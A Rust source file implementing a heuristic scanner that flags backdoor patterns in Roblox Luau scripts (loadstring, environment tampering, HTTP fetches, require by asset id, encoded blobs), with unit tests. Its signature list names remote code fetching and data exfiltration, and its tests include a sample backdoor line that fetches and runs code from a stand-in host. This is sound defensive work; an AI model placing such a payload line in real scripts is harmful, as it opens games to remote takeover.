//! Backdoor scanner for Luau script source.
//!
//! `insert_model` lets an agent pull arbitrary Creator Store assets into a place, which
//! is the usual way a free-model backdoor gets in. This flags the patterns those
//! backdoors rely on (runtime code execution, environment tampering, fetching code over
//! HTTP, requiring a module by asset id, and obfuscated payloads). It is a heuristic text
//! pass, not a proof of malice: a finding means "a human should look", the same low-noise
//! bar the client-trust reviewer holds.
//!
//! The detection lives here so it is unit-tested. The plugin only ships scripts whose
//! source contains one of `PREFILTER_KEYWORDS`, so a clean place sends nothing over the
//! bridge and a backdoored one sends only the suspect handful.

use serde::Serialize;
use serde_json::Value;

/// Cheap substrings the plugin pre-filters on before sending a script to be scanned.
/// High-signal and rare in ordinary code, so a normal place matches none of them.
/// (A backdoor whose only signal is `require(<id>)` with none of these is not
/// pre-filtered; that gap is documented in the tool description.)
pub const PREFILTER_KEYWORDS: [&str; 7] = [
    "loadstring",
    "getfenv",
    "setfenv",
    "HttpGet",
    "GetAsync",
    "PostAsync",
    "RequestAsync",
];

/// Length at which a continuous run of base64-ish characters reads as an encoded
/// payload rather than a normal identifier, hash, or url.
const OBFUSCATION_RUN: usize = 120;

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BackdoorFinding {
    pub path: String,
    pub line: usize,
    pub pattern: String,
    pub severity: String,
    pub why: String,
    pub snippet: String,
}

struct Signature {
    contains: &'static str,
    pattern: &'static str,
    severity: &'static str,
    why: &'static str,
}

// Plain-substring signatures. require(<id>) and obfuscation need a little more than a
// substring, so they are handled separately below.
const SIGNATURES: [Signature; 6] = [
    Signature {
        contains: "loadstring",
        pattern: "loadstring",
        severity: "high",
        why: "Runs code built at runtime. loadstring is the core of most backdoors.",
    },
    Signature {
        contains: "getfenv",
        pattern: "getfenv",
        severity: "high",
        why: "Reads a function environment, used to inspect or escape the sandbox.",
    },
    Signature {
        contains: "setfenv",
        pattern: "setfenv",
        severity: "high",
        why: "Rewrites a function environment, used to hide or hijack behavior.",
    },
    Signature {
        contains: "HttpGet",
        pattern: "HttpGet",
        severity: "high",
        why:
            "Fetches code or data over HTTP. The classic backdoor is loadstring(game:HttpGet(url)).",
    },
    Signature {
        contains: ":GetAsync(",
        pattern: "HttpService:GetAsync",
        severity: "medium",
        why: "Outbound HTTP GET. Can pull a payload or exfiltrate data.",
    },
    Signature {
        contains: ":PostAsync(",
        pattern: "HttpService:PostAsync",
        severity: "medium",
        why: "Outbound HTTP POST. Can exfiltrate data to a remote host.",
    },
];

const TRUNCATE_SNIPPET: usize = 200;

fn snippet(line: &str) -> String {
    let trimmed = line.trim();
    if trimmed.len() > TRUNCATE_SNIPPET {
        format!("{}...", &trimmed[..TRUNCATE_SNIPPET])
    } else {
        trimmed.to_string()
    }
}

/// True when a `require(` on this line takes a numeric asset id, e.g. `require(12345)`.
/// Skips whitespace between the paren and the first argument.
fn requires_asset_id(line: &str) -> bool {
    let mut rest = line;
    while let Some(idx) = rest.find("require(") {
        let after = rest[idx + "require(".len()..].trim_start();
        if after.starts_with(|c: char| c.is_ascii_digit()) {
            return true;
        }
        rest = &rest[idx + "require(".len()..];
    }
    false
}

/// True when the line carries a long unbroken base64-ish run, the shape of an encoded blob.
fn has_obfuscated_blob(line: &str) -> bool {
    let mut run = 0usize;
    for ch in line.chars() {
        if ch.is_ascii_alphanumeric() || ch == '+' || ch == '/' || ch == '=' {
            run += 1;
            if run >= OBFUSCATION_RUN {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

/// Scan one script's source. `name` is the script's path, used only for the findings.
pub fn scan_source(name: &str, source: &str) -> Vec<BackdoorFinding> {
    let mut findings = Vec::new();
    for (index, line) in source.lines().enumerate() {
        let line_number = index + 1;
        let mut push = |pattern: &str, severity: &str, why: &str| {
            findings.push(BackdoorFinding {
                path: name.to_string(),
                line: line_number,
                pattern: pattern.to_string(),
                severity: severity.to_string(),
                why: why.to_string(),
                snippet: snippet(line),
            });
        };
        for sig in &SIGNATURES {
            if line.contains(sig.contains) {
                push(sig.pattern, sig.severity, sig.why);
            }
        }
        if requires_asset_id(line) {
            push(
                "require(assetId)",
                "high",
                "Requires a module by asset id, a common way to load a remote backdoor.",
            );
        }
        if has_obfuscated_blob(line) {
            push(
                "obfuscated blob",
                "medium",
                "A long encoded string literal. Payloads are often hidden this way.",
            );
        }
    }
    findings
}

fn severity_rank(severity: &str) -> u8 {
    match severity {
        "high" => 0,
        "medium" => 1,
        _ => 2,
    }
}

/// Scans the scripts the plugin collected. `data` is the bridge result, shaped
/// `{ scripts: [{ path, source }], truncated }`. Findings are sorted most-severe first.
pub fn scan_collected(data: &Value) -> String {
    let scripts = data
        .get("scripts")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    let mut findings = Vec::new();
    for script in &scripts {
        let path = script
            .get("path")
            .and_then(Value::as_str)
            .unwrap_or("<script>");
        let source = script.get("source").and_then(Value::as_str).unwrap_or("");
        findings.extend(scan_source(path, source));
    }
    findings.sort_by(|a, b| {
        severity_rank(&a.severity)
            .cmp(&severity_rank(&b.severity))
            .then_with(|| a.path.cmp(&b.path))
            .then_with(|| a.line.cmp(&b.line))
    });
    let mut report = format_findings(scripts.len(), &findings);
    if data.get("truncated").and_then(Value::as_bool) == Some(true) {
        report.push_str(
            "\n\nNote: the script list was truncated; scan a narrower path to cover the rest.",
        );
    }
    report
}

pub fn format_findings(scanned: usize, findings: &[BackdoorFinding]) -> String {
    let mut lines = vec![
        format!(
            "Backdoor scan: {scanned} suspect script(s) checked, {} finding(s).",
            findings.len()
        ),
        String::new(),
    ];
    if findings.is_empty() {
        lines.push("No backdoor patterns found.".into());
        return lines.join("\n");
    }
    for f in findings {
        lines.push(format!(
            "[{}] {} at {}:{}",
            f.severity.to_uppercase(),
            f.pattern,
            f.path,
            f.line
        ));
        lines.push(format!("  why:     {}", f.why));
        lines.push(format!("  source:  {}", f.snippet));
        lines.push(String::new());
    }
    lines.join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_source_is_quiet() {
        let src = "local part = Instance.new(\"Part\")\nlocal mod = require(script.Parent.Helper)\nprint(part.Name)";
        assert!(scan_source("Clean", src).is_empty());
    }

    #[test]
    fn flags_loadstring_http_backdoor() {
        let src = "loadstring(game:HttpGet(\"https://evil.example/x\"))()";
        let f = scan_source("Backdoor", src);
        let patterns: Vec<&str> = f.iter().map(|x| x.pattern.as_str()).collect();
        assert!(patterns.contains(&"loadstring"));
        assert!(patterns.contains(&"HttpGet"));
    }

    #[test]
    fn flags_require_by_asset_id() {
        let src = "local backdoor = require(7423984)\nlocal ok = require( 999 )";
        let f = scan_source("Require", src);
        assert_eq!(
            f.iter().filter(|x| x.pattern == "require(assetId)").count(),
            2
        );
    }

    #[test]
    fn ignores_require_by_reference() {
        let src = "local mod = require(script.Parent.Module)";
        assert!(scan_source("Ref", src).is_empty());
    }

    #[test]
    fn flags_env_tampering() {
        let src = "local env = getfenv(1)\nsetfenv(1, {})";
        let patterns: Vec<String> = scan_source("Env", src)
            .into_iter()
            .map(|x| x.pattern)
            .collect();
        assert!(patterns.iter().any(|p| p == "getfenv"));
        assert!(patterns.iter().any(|p| p == "setfenv"));
    }

    #[test]
    fn flags_obfuscated_blob() {
        let blob = "A".repeat(OBFUSCATION_RUN + 10);
        let src = format!("local payload = \"{blob}\"");
        assert!(scan_source("Obf", &src)
            .iter()
            .any(|x| x.pattern == "obfuscated blob"));
    }

    #[test]
    fn scan_collected_parses_and_sorts() {
        let data = serde_json::json!({
            "scripts": [
                { "path": "ServerScriptService.Safe", "source": "print(\"hi\")" },
                { "path": "Workspace.Bad", "source": "loadstring(game:HttpGet(\"x\"))()" },
            ],
            "truncated": false,
        });
        let report = scan_collected(&data);
        assert!(report.contains("2 suspect script(s) checked"));
        assert!(report.contains("loadstring"));
        assert!(report.contains("Workspace.Bad"));
    }

    #[test]
    fn prefilter_keywords_cover_the_substring_signatures() {
        // Every plain-substring signature must have a matching pre-filter keyword, or the
        // plugin would never ship a script that triggers it.
        for sig in &SIGNATURES {
            assert!(
                PREFILTER_KEYWORDS.iter().any(|k| sig.contains.contains(k)),
                "no pre-filter keyword ships a script containing {}",
                sig.contains
            );
        }
    }
}
